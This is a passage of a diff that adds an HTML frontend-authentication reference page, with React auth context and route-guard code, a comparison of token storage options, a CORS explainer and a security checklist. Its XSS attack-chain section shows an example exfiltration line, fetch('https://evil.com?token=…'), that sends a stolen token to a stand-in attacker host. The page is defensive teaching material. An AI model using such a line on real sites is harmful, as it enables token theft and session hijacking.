+      <span class="fn">setUser</span>(<span class="kw">null</span>); <span class="cmt">// not authenticated</span>
+    } <span class="kw">finally</span> {
+      <span class="fn">setLoading</span>(<span class="kw">false</span>);
+    }
+  }, []);
+
+  <span class="kw">const</span> login = <span class="kw">async</span> (credentials) => {
+    <span class="kw">const</span> { data } = <span class="kw">await</span> api.<span class="fn">post</span>(<span class="str">'/auth/login'</span>, credentials);
+    accessToken = data.accessToken; <span class="cmt">// in-memory only</span>
+    <span class="fn">setUser</span>(data.user);
+  };
+
+  <span class="kw">const</span> logout = <span class="kw">async</span> () => {
+    <span class="kw">await</span> api.<span class="fn">post</span>(<span class="str">'/auth/logout'</span>);
+    accessToken = <span class="kw">null</span>;
+    <span class="fn">setUser</span>(<span class="kw">null</span>);
+  };
+
+  <span class="kw">return</span> (
+    <span class="tag">&lt;AuthContext.Provider</span> <span class="attr">value</span>={{ user, login, logout, loading }}<span class="tag">&gt;</span>
+      {loading ? <span class="tag">&lt;LoadingScreen</span> <span class="tag">/&gt;</span> : children}
+    <span class="tag">&lt;/AuthContext.Provider&gt;</span>
+  );
+}</div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">React — ProtectedRoute with role support</span>
+        <button class="code-copy" onclick="copyCode(this)">copy</button>
+      </div>
+      <div class="code-body"><span class="kw">function</span> <span class="fn">ProtectedRoute</span>({ children, requiredRole }) {
+  <span class="kw">const</span> { user } = <span class="fn">useAuth</span>();
+
+  <span class="cmt">// Not authenticated → go to login</span>
+  <span class="kw">if</span> (!user) <span class="kw">return</span> <span class="tag">&lt;Navigate</span> <span class="attr">to</span>=<span class="str">"/login"</span> <span class="attr">replace</span> <span class="tag">/&gt;</span>;
+
+  <span class="cmt">// Authenticated but wrong role → 403 page (NOT login redirect)</span>
+  <span class="kw">if</span> (requiredRole && !user.roles.<span class="fn">includes</span>(requiredRole)) {
+    <span class="kw">return</span> <span class="tag">&lt;Forbidden</span> <span class="tag">/&gt;</span>; <span class="cmt">// show access denied, not login</span>
+  }
+
+  <span class="kw">return</span> children;
+}
+
+<span class="cmt">// Usage</span>
+<span class="tag">&lt;Route</span> <span class="attr">path</span>=<span class="str">"/admin"</span>
+  <span class="attr">element</span>={<span class="tag">&lt;ProtectedRoute</span> <span class="attr">requiredRole</span>=<span class="str">"admin"</span><span class="tag">&gt;&lt;AdminPanel</span> <span class="tag">/&gt;&lt;/ProtectedRoute&gt;</span>}
+<span class="tag">/&gt;</span></div>
+    </div>
+
+    <div class="callout callout-info">
+      <span class="callout-icon">🏗️</span>
+      <div class="callout-body">
+        <strong>State management tip:</strong> For small apps, React Context works fine. For complex apps (multiple tabs, background token refresh, optimistic updates), consider <strong>Zustand</strong> — it avoids unnecessary re-renders and supports middleware for token persistence logic.
+      </div>
+    </div>
+  </section>
+
+  <!-- ── Security / Storage ── -->
+  <section class="section" id="security">
+    <div class="section-label">Security & storage</div>
+    <div class="section-title">XSS, Token Storage & Real Risks</div>
+    <p class="section-intro">
+      Where you store tokens determines your attack surface. There's no perfect option — only informed trade-offs. Here's the risk landscape.
+    </p>
+
+    <!-- XSS risk visual -->
+    <div class="risk-diagram">
+      <div style="font-family: var(--mono); font-size: 11px; color: var(--text3); margin-bottom: 16px; text-transform: uppercase; letter-spacing: 0.08em;">XSS Token Exposure Risk by Storage Method</div>
+      <div class="risk-row">
+        <div class="risk-label">localStorage</div>
+        <div class="risk-bar-wrap">
+          <div class="risk-bar risk-high-bar">🔴 HIGH — any XSS payload can read it instantly via JavaScript</div>
+        </div>
+      </div>
+      <div class="risk-row">
+        <div class="risk-label">sessionStorage</div>
+        <div class="risk-bar-wrap">
+          <div class="risk-bar risk-high-bar">🔴 HIGH — same JS access as localStorage, different lifetime only</div>
+        </div>
+      </div>
+      <div class="risk-row">
+        <div class="risk-label">Memory (variable)</div>
+        <div class="risk-bar-wrap">
+          <div class="risk-bar risk-med-bar">🟡 MED — lost on refresh; XSS can still read it if malicious JS runs</div>
+        </div>
+      </div>
+      <div class="risk-row">
+        <div class="risk-label">HttpOnly cookie</div>
+        <div class="risk-bar-wrap">
+          <div class="risk-bar risk-low-bar">🟢 LOW — JS cannot read; CSRF risk instead</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Storage comparison tabs -->
+    <div class="storage-grid">
+      <div class="storage-card">
+        <div class="sc-title"><span class="sc-risk risk-high"></span>localStorage</div>
+        <div class="sc-rows">
+          <div class="sc-row"><span class="sc-key">Scope</span><span class="sc-val">All tabs, same origin</span></div>
+          <div class="sc-row"><span class="sc-key">Lifetime</span><span class="sc-val">Until manually cleared</span></div>
+          <div class="sc-row"><span class="sc-key">JS access</span><span class="sc-val badge badge-red">Yes</span></div>
+          <div class="sc-row"><span class="sc-key">Auto-sent to server</span><span class="sc-val badge badge-red">No</span></div>
+          <div class="sc-row"><span class="sc-key">XSS risk</span><span class="sc-val badge badge-red">Critical</span></div>
+          <div class="sc-row"><span class="sc-key">Best for</span><span class="sc-val">Non-sensitive prefs</span></div>
+        </div>
+      </div>
+
+      <div class="storage-card">
+        <div class="sc-title"><span class="sc-risk risk-high"></span>sessionStorage</div>
+        <div class="sc-rows">
+          <div class="sc-row"><span class="sc-key">Scope</span><span class="sc-val">This tab only</span></div>
+          <div class="sc-row"><span class="sc-key">Lifetime</span><span class="sc-val">Tab close = gone</span></div>
+          <div class="sc-row"><span class="sc-key">JS access</span><span class="sc-val badge badge-red">Yes</span></div>
+          <div class="sc-row"><span class="sc-key">Auto-sent to server</span><span class="sc-val badge badge-red">No</span></div>
+          <div class="sc-row"><span class="sc-key">XSS risk</span><span class="sc-val badge badge-red">Critical</span></div>
+          <div class="sc-row"><span class="sc-key">Best for</span><span class="sc-val">Temp wizard state</span></div>
+        </div>
+      </div>
+
+      <div class="storage-card">
+        <div class="sc-title"><span class="sc-risk risk-med"></span>Memory (JS var)</div>
+        <div class="sc-rows">
+          <div class="sc-row"><span class="sc-key">Scope</span><span class="sc-val">Current tab runtime</span></div>
+          <div class="sc-row"><span class="sc-key">Lifetime</span><span class="sc-val">Refresh = gone</span></div>
+          <div class="sc-row"><span class="sc-key">JS access</span><span class="sc-val badge badge-yellow">In-scope only</span></div>
+          <div class="sc-row"><span class="sc-key">Auto-sent to server</span><span class="sc-val badge badge-red">No</span></div>
+          <div class="sc-row"><span class="sc-key">XSS risk</span><span class="sc-val badge badge-yellow">Medium</span></div>
+          <div class="sc-row"><span class="sc-key">Best for</span><span class="sc-val badge badge-green">Access tokens ✓</span></div>
+        </div>
+      </div>
+
+      <div class="storage-card">
+        <div class="sc-title"><span class="sc-risk risk-low"></span>HttpOnly Cookie</div>
+        <div class="sc-rows">
+          <div class="sc-row"><span class="sc-key">Scope</span><span class="sc-val">Domain / Path</span></div>
+          <div class="sc-row"><span class="sc-key">Lifetime</span><span class="sc-val">Max-Age / Expires</span></div>
+          <div class="sc-row"><span class="sc-key">JS access</span><span class="sc-val badge badge-green">Blocked</span></div>
+          <div class="sc-row"><span class="sc-key">Auto-sent to server</span><span class="sc-val badge badge-green">Yes</span></div>
+          <div class="sc-row"><span class="sc-key">XSS risk</span><span class="sc-val badge badge-green">Low</span></div>
+          <div class="sc-row"><span class="sc-key">Best for</span><span class="sc-val badge badge-green">Refresh tokens ✓</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="callout callout-success">
+      <span class="callout-icon">✅</span>
+      <div class="callout-body">
+        <strong>Recommended pattern:</strong> Store the <strong>access token in memory</strong> (a module-level variable), store the <strong>refresh token in an HttpOnly cookie</strong> (set by server). On page refresh, call <code>/auth/refresh</code> silently to get a new access token from the cookie. Discuss the BFF pattern with your backend team.
+      </div>
+    </div>
+
+    <div class="accordion" style="margin-top: 20px;">
+      <div class="acc-item">
+        <div class="acc-trigger" onclick="toggleAcc(this)">
+          <div class="acc-trigger-left">
+            <span class="acc-icon">⚡</span>
+            <span class="acc-title">XSS Attack Chain — How Token Theft Happens</span>
+          </div>
+          <span class="acc-arrow">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="acc-body-inner">
+            <p>Understanding the attack chain helps you defend against it:</p>
+            <div class="oauth-steps" style="margin-top: 12px;">
+              <div class="oauth-step">
+                <div class="step-num" style="background: rgba(248,113,113,0.1); border-color: rgba(248,113,113,0.3); color: var(--red);">1</div>
+                <div class="step-content">
+                  <div class="step-title">Injection vector</div>
+                  <div class="step-desc">Attacker injects malicious JS via unsanitized user input, compromised npm package, or third-party script.</div>
+                </div>
+              </div>
+              <div class="oauth-step">
+                <div class="step-num" style="background: rgba(248,113,113,0.1); border-color: rgba(248,113,113,0.3); color: var(--red);">2</div>
+                <div class="step-content">
+                  <div class="step-title">Token extraction</div>
+                  <div class="step-desc">Script runs <code>localStorage.getItem('token')</code> or reads React state via dev tools hooks.</div>
+                </div>
+              </div>
+              <div class="oauth-step">
+                <div class="step-num" style="background: rgba(248,113,113,0.1); border-color: rgba(248,113,113,0.3); color: var(--red);">3</div>
+                <div class="step-content">
+                  <div class="step-title">Token exfiltration</div>
+                  <div class="step-desc">Token is sent to attacker's server via <code>fetch('https://evil.com?token=…')</code>.</div>
+                </div>
+              </div>
+              <div class="oauth-step">
+                <div class="step-num" style="background: rgba(248,113,113,0.1); border-color: rgba(248,113,113,0.3); color: var(--red);">4</div>
+                <div class="step-content">
+                  <div class="step-title">Session hijack</div>
+                  <div class="step-desc">Attacker uses the token from their own machine to impersonate the user for the token's remaining lifetime.</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="acc-item">
+        <div class="acc-trigger" onclick="toggleAcc(this)">
+          <div class="acc-trigger-left">
+            <span class="acc-icon">🎭</span>
+            <span class="acc-title">CORS is Not Auth — A Common Misconception</span>
+          </div>
+          <span class="acc-arrow">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="acc-body-inner">
+            <p>CORS (Cross-Origin Resource Sharing) controls which origins the browser allows to make requests to your API. It is <strong>not a security mechanism against attackers</strong> — it's a browser feature that protects users from malicious websites making requests on their behalf.</p>
+            <p>A server-side script, curl, or Postman ignore CORS entirely. CORS only runs in browsers. Your API needs proper authentication regardless of CORS settings.</p>
+            <div class="callout callout-danger" style="margin-top: 12px;">
+              <span class="callout-icon">❌</span>
+              <div class="callout-body">Don't think: <em>"My API has CORS configured, so it's protected."</em> CORS prevents certain browser behaviors — it doesn't authenticate requests.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── Checklist ── -->
+  <section class="section" id="checklist">
+    <div class="section-label">Final reference</div>
+    <div class="section-title">Frontend Auth — Do's & Don'ts</div>
+    <p class="section-intro">
+      Pin this. Review it before shipping any auth-related code.
+    </p>
+
+    <div class="checklist">
+      <div class="check-col do-col">
+        <div class="check-col-title">✓ Do these</div>
+        <div class="check-item"><span class="ci-icon">✅</span>Refresh access token proactively before expiry (check <code>exp</code>)</div>
+        <div class="check-item"><span class="ci-icon">✅</span>Call server logout endpoint — don't just clear client state</div>
+        <div class="check-item"><span class="ci-icon">✅</span>Distinguish 401 (unauthenticated) from 403 (unauthorized) in UI</div>
+        <div class="check-item"><span class="ci-icon">✅</span>Use a single refresh promise to prevent race conditions</div>
+        <div class="check-item"><span class="ci-icon">✅</span>Store access tokens in memory, refresh in HttpOnly cookie</div>
+        <div class="check-item"><span class="ci-icon">✅</span>Show role-specific UI from API data, not hardcoded checks</div>
+        <div class="check-item"><span class="ci-icon">✅</span>Use Authorization Code + PKCE for any OAuth SPA flow</div>
+        <div class="check-item"><span class="ci-icon">✅</span>Sanitize all user input to prevent XSS injection vectors</div>
+      </div>
+      <div class="check-col dont-col">
+        <div class="check-col-title">✗ Never do these</div>
+        <div class="check-item"><span class="ci-icon">❌</span>Store tokens in <code>localStorage</code> or <code>sessionStorage</code></div>
+        <div class="check-item"><span class="ci-icon">❌</span>Put passwords, full PII, or secrets in JWT payload</div>
+        <div class="check-item"><span class="ci-icon">❌</span>Redirect to login on 403 — that's a UX bug, not a security feature</div>
+        <div class="check-item"><span class="ci-icon">❌</span>Think "hiding the button = secured the feature"</div>
+        <div class="check-item"><span class="ci-icon">❌</span>Log tokens to console, analytics, or error trackers</div>
+        <div class="check-item"><span class="ci-icon">❌</span>Use the Implicit OAuth flow for new projects</div>
+        <div class="check-item"><span class="ci-icon">❌</span>Treat CORS as an authentication mechanism</div>
+        <div class="check-item"><span class="ci-icon">❌</span>Fire multiple refresh calls in parallel — use a shared promise</div>
+      </div>
+    </div>
+
+    <!-- Quick reference tooltip section -->
+    <div style="margin-top: 36px; padding: 24px; background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius);">
+      <div style="font-family: var(--mono); font-size: 11px; color: var(--text3); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 16px;">Quick Reference — Hover for definitions</div>
+      <div style="display: flex; gap: 20px; flex-wrap: wrap; font-size: 14px; color: var(--text2);">
+        <span class="tooltip-wrap">AuthN
+          <div class="tooltip-box">Authentication — proving who you are. Happens before AuthZ. Failure = 401.</div>
+        </span>
+        <span class="tooltip-wrap">AuthZ
+          <div class="tooltip-box">Authorization — what you're allowed to do. Requires successful AuthN first. Failure = 403.</div>
+        </span>
+        <span class="tooltip-wrap">JWT
+          <div class="tooltip-box">JSON Web Token. Three Base64 parts: header.payload.signature. Payload is readable — not encrypted.</div>
+        </span>
+        <span class="tooltip-wrap">PKCE
+          <div class="tooltip-box">Proof Key for Code Exchange. Prevents auth code interception in SPA OAuth flows. Required for public clients.</div>
+        </span>
+        <span class="tooltip-wrap">BFF
+          <div class="tooltip-box">Backend For Frontend. A server-side layer that handles OAuth flows and token storage so the browser never sees raw tokens.</div>
+        </span>
+        <span class="tooltip-wrap">CSRF
+          <div class="tooltip-box">Cross-Site Request Forgery. Attacker tricks browser into sending cookie-authenticated request. Mitigated by SameSite + CSRF tokens.</div>
+        </span>
+        <span class="tooltip-wrap">XSS
+          <div class="tooltip-box">Cross-Site Scripting. Malicious script injected into your page. Can read localStorage, steal tokens. Mitigation: sanitize input, HttpOnly cookies.</div>
+        </span>
+        <span class="tooltip-wrap">HttpOnly
+          <div class="tooltip-box">Cookie attribute that blocks JavaScript access. document.cookie and XSS scripts cannot read it. Only sent via HTTP requests.</div>
+        </span>
+        <span class="tooltip-wrap">OIDC
+          <div class="tooltip-box">OpenID Connect. OAuth 2.0 extension that adds identity. Provides an ID token (JWT) with user profile data on top of the access token.</div>
+        </span>
+        <span class="tooltip-wrap">Refresh Token
+          <div class="tooltip-box">Long-lived token used only to get new access tokens. Should live in HttpOnly cookie. If compromised, attacker has long-term access.</div>
+        </span>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <div style="margin-top: 48px; padding-top: 24px; border-top: 1px solid var(--border); display: flex; align-items: center; gap: 12px; color: var(--text3); font-size: 13px; font-family: var(--mono);">
+      <span class="live-dot"></span>
+      Frontend Auth & AuthZ — Complete Reference
+      <span style="margin-left: auto;">Built for frontend engineers</span>
+    </div>
+  </section>
+
+</main>
+
+<script>
+  // ── Progress bar ──
+  function updateProgressBar() {
+    const doc = document.documentElement;
+    const maxScroll = doc.scrollHeight - doc.clientHeight;
+    const pct = maxScroll > 0 ? (doc.scrollTop / maxScroll) * 100 : 0;
+    document.getElementById('progress').style.width = Math.max(0, Math.min(100, pct)) + '%';
+  }
+
+  window.addEventListener('scroll', updateProgressBar);
+  window.addEventListener('resize', updateProgressBar);
+  updateProgressBar();
+
+  // ── Accordion ──
+  function toggleAcc(trigger) {
+    const item = trigger.closest('.acc-item');
+    const body = item.querySelector('.acc-body');
+    const isOpen = item.classList.contains('open');
+
+    if (isOpen) {
+      body.style.maxHeight = '0';
+      item.classList.remove('open');
+    } else {
+      body.style.maxHeight = body.scrollHeight + 'px';
+      item.classList.add('open');
+    }
+  }
+
+  // ── Tabs ──
+  function switchTab(btn, panelId) {
+    const wrapper = btn.closest('.tabs-wrapper');
+    wrapper.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    wrapper.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById(panelId).classList.add('active');
+  }
+
+  // ── Status card toggle ──
+  function toggleStatus(card) {
+    card.classList.toggle('expanded');
+  }
+
+  // ── Mode toggle (beginner / advanced) ──
+  function toggleMode(checkbox) {
+    const content = document.getElementById('token-content');
+    if (checkbox.checked) {
+      content.classList.add('advanced-mode');
+    } else {
+      content.classList.remove('advanced-mode');
+    }
+  }
+
+  // ── Nav active state ──
+  function setActive(el) {
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    el.classList.add('active');
+  }
+
+  // ── Scroll spy ──
+  const sections = document.querySelectorAll('section[id]');
+  const navItems = document.querySelectorAll('.nav-item');
+
+  if ('IntersectionObserver' in window) {
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          navItems.forEach(n => {
+            n.classList.toggle('active', n.getAttribute('href') === '#' + entry.target.id);
+          });
+        }
+      });
+    }, { rootMargin: '-30% 0px -60% 0px' });
+
+    sections.forEach(s => observer.observe(s));
+  }
+
+  // ── Copy code ──
+  function copyCode(btn) {
+    const body = btn.closest('.code-block').querySelector('.code-body');
+    const text = body.innerText;
+
+    const markCopied = () => {
+      btn.textContent = 'copied!';
+      btn.style.color = 'var(--green)';
+      setTimeout(() => { btn.textContent = 'copy'; btn.style.color = ''; }, 1500);
+    };
+
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).then(markCopied).catch(() => fallbackCopy(text, markCopied));
+    } else {
+      fallbackCopy(text, markCopied);
+    }
+  }
+
+  function fallbackCopy(text, onSuccess) {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    ta.setAttribute('readonly', '');
+    ta.style.position = 'fixed';
+    ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+
+    try {
+      const ok = document.execCommand('copy');
+      if (ok) onSuccess();
+    } finally {
+      document.body.removeChild(ta);
+    }
+  }
+
+  // ── JWT decoder ──
+  function escapeHTML(value) {
+    return String(value)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;');
+  }
+
+  function base64UrlDecode(str) {
+    let b64 = str.replace(/-/g, '+').replace(/_/g, '/');
+    while (b64.length % 4) b64 += '=';
+
+    const binary = atob(b64);
+    const bytes = Array.from(binary, (ch) => ch.charCodeAt(0));
+    const utf8 = decodeURIComponent(bytes.map((byte) => `%${byte.toString(16).padStart(2, '0')}`).join(''));
+    return JSON.parse(utf8);
+  }
+
+  function appendJsonBlock(parent, label, color, value) {
+    const title = document.createElement('div');
+    title.style.color = color;
+    title.textContent = `// ${label}`;
+    parent.appendChild(title);
+
+    const pre = document.createElement('pre');
+    pre.style.margin = '0';
+    pre.style.whiteSpace = 'pre-wrap';
+    pre.style.fontFamily = 'inherit';
+    pre.style.color = 'inherit';
+    pre.textContent = JSON.stringify(value, null, 2);
+    parent.appendChild(pre);
+  }
+
+  function decodeJWT() {
+    const input = document.getElementById('jwt-demo-input').value.trim();
+    const output = document.getElementById('jwt-demo-output');
+    output.style.display = 'block';
+    output.style.color = 'var(--text2)';
+    output.innerHTML = '';
+
+    if (!input) {
+      output.textContent = 'Paste a JWT token above.';
+      return;
+    }
+
+    const parts = input.split('.');
+    if (parts.length !== 3) {
+      output.style.color = 'var(--red)';
+      output.textContent = '✗ Not a valid JWT — expected 3 parts separated by dots.';
+      return;
+    }
+
+    try {
+      const header = base64UrlDecode(parts[0]);
+      const payload = base64UrlDecode(parts[1]);
+      const expDate = payload.exp ? new Date(payload.exp * 1000).toLocaleString() : 'N/A';
+      const isExpired = typeof payload.exp === 'number' ? (Date.now() / 1000 > payload.exp) : null;
+
+      appendJsonBlock(output, 'Header', 'var(--orange)', header);
+
+      const spacer1 = document.createElement('div');
+      spacer1.style.height = '12px';
+      output.appendChild(spacer1);
+
+      appendJsonBlock(output, 'Payload', 'var(--blue2)', payload);
+
+      const spacer2 = document.createElement('div');
+      spacer2.style.height = '12px';
+      output.appendChild(spacer2);
+
+      const signature = document.createElement('div');
+      signature.style.color = 'var(--text3)';
+      signature.textContent = '// Signature: not shown (server-side verification only)';
+      output.appendChild(signature);
+
+      const spacer3 = document.createElement('div');
+      spacer3.style.height = '12px';
+      output.appendChild(spacer3);
+
+      const expiry = document.createElement('div');
+      expiry.style.color = isExpired === null ? 'var(--text3)' : (isExpired ? 'var(--red)' : 'var(--green)');
+      expiry.textContent = `// Expiry: ${expDate}${isExpired === true ? ' ⚠️ EXPIRED' : isExpired === false ? ' ✓ Valid' : ''}`;
+      output.appendChild(expiry);
+    } catch (e) {
+      output.style.color = 'var(--red)';
+      output.textContent = '✗ Could not decode — payload may be malformed or encoded incorrectly.';
+    }
+  }
+
+  // ── Keyboard shortcut: Enter in JWT textarea ──
+  document.getElementById('jwt-demo-input').addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' && e.ctrlKey) decodeJWT();
+  });
+</script>
+</body>
+</html>
